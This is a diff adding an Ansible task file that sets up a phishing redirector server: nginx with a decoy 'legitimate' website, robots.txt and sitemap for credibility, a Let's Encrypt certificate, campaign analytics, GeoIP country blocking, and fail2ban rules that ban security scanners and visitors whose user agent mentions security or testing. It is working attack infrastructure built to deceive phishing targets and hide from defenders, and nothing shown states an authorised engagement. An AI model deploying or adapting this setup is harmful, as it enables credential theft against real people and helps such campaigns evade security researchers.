@@ -1,0 +1,157 @@
+---
+# Configure phishing redirector with advanced evasion techniques
+
+- name: Install packages for phishing redirector
+  apt:
+    name:
+      - nginx
+      - nginx-extras
+      - certbot
+      - python3-certbot-nginx
+      - socat
+      - netcat-openbsd
+      - jq
+      - curl
+      - geoip-database
+      - libgeoip1
+      - php-fpm
+      - php-geoip
+    state: present
+
+- name: Configure advanced nginx for phishing redirector
+  template:
+    src: "../templates/phishing/nginx-phishing-redirector.j2"
+    dest: /etc/nginx/sites-available/phishing-redirector
+    mode: '0644'
+  notify: restart nginx
+
+- name: Enable phishing redirector site
+  file:
+    src: /etc/nginx/sites-available/phishing-redirector
+    dest: /etc/nginx/sites-enabled/phishing-redirector
+    state: link
+  notify: restart nginx
+
+- name: Remove default nginx site
+  file:
+    path: /etc/nginx/sites-enabled/default
+    state: absent
+  notify: restart nginx
+
+- name: Create legitimate website content
+  template:
+    src: "../templates/phishing/legitimate-website.html.j2"
+    dest: /var/www/html/index.html
+    mode: '0644'
+
+- name: Create robots.txt for SEO legitimacy
+  copy:
+    dest: /var/www/html/robots.txt
+    content: |
+      User-agent: *
+      Allow: /
+      Sitemap: https://{{ phishing_subdomain }}.{{ phishing_domain }}/sitemap.xml
+
+- name: Create sitemap for legitimacy
+  template:
+    src: "../templates/phishing/sitemap.xml.j2"
+    dest: /var/www/html/sitemap.xml
+    mode: '0644'
+
+- name: Install MaxMind GeoIP for location-based filtering
+  get_url:
+    url: "https://download.maxmind.com/app/geoip_download?edition_id=GeoLite2-Country&license_key={{ maxmind_license_key | default('') }}&suffix=tar.gz"
+    dest: /tmp/geoip.tar.gz
+  when: maxmind_license_key is defined
+  ignore_errors: yes
+
+- name: Create security research filtering script
+  template:
+    src: "../templates/phishing/security-filter.lua.j2"
+    dest: /etc/nginx/security-filter.lua
+    mode: '0644'
+
+- name: Configure nginx stream module for advanced traffic analysis
+  template:
+    src: "../templates/phishing/stream-analysis.conf.j2"
+    dest: /etc/nginx/modules-enabled/stream-analysis.conf
+    mode: '0644'
+
+- name: Create phishing campaign analytics
+  template:
+    src: "../templates/phishing/analytics.js.j2"
+    dest: /var/www/html/analytics.js
+    mode: '0644'
+
+- name: Set up legitimate SSL certificate
+  shell: |
+    certbot --nginx -d {{ phishing_subdomain }}.{{ phishing_domain }} \
+    --non-interactive --agree-tos -m {{ letsencrypt_email }}
+  args:
+    creates: /etc/letsencrypt/live/{{ phishing_subdomain }}.{{ phishing_domain }}/fullchain.pem
+  ignore_errors: yes
+
+- name: Create fail2ban configuration for suspicious activity
+  copy:
+    dest: /etc/fail2ban/jail.d/phishing-protection.conf
+    content: |
+      [phishing-scanner-protection]
+      enabled = true
+      port = 80,443
+      filter = phishing-scanner
+      logpath = /var/log/nginx/access.log
+      maxretry = 3
+      bantime = 3600
+      findtime = 300
+
+- name: Create fail2ban filter for security tools
+  copy:
+    dest: /etc/fail2ban/filter.d/phishing-scanner.conf
+    content: |
+      [Definition]
+      failregex = ^<HOST>.*"(GET|POST).*(nmap|nikto|sqlmap|burp|w3af|nessus|openvas).*"
+                  ^<HOST>.*".*User-Agent.*(scanner|bot|crawl|security|test).*"
+                  ^<HOST>.*"(GET|POST).*\.(php|asp|jsp)\?.*"
+      ignoreregex =
+
+- name: Start and enable fail2ban
+  systemd:
+    name: fail2ban
+    state: started
+    enabled: yes
+
+- name: Create traffic monitoring script
+  template:
+    src: "../templates/phishing/traffic-monitor.sh.j2"
+    dest: /root/Tools/traffic-monitor.sh
+    mode: '0755'
+
+- name: Set up traffic monitoring cron
+  cron:
+    name: "Monitor phishing traffic"
+    minute: "*/5"
+    job: "/root/Tools/traffic-monitor.sh >> /var/log/phishing-traffic.log 2>&1"
+
+- name: Configure rate limiting for suspicious patterns
+  blockinfile:
+    path: /etc/nginx/nginx.conf
+    insertbefore: "http {"
+    block: |
+      # Rate limiting zones
+      limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
+      limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
+      
+      # GeoIP configuration
+      geoip_country /usr/share/GeoIP/GeoIP.dat;
+      map $geoip_country_code $allowed_country {
+          default 1;
+          CN 0;
+          RU 0;
+          KP 0;
+      }
+
+handlers:
+  - name: restart nginx
+    service:
+      name: nginx
+      state: restarted
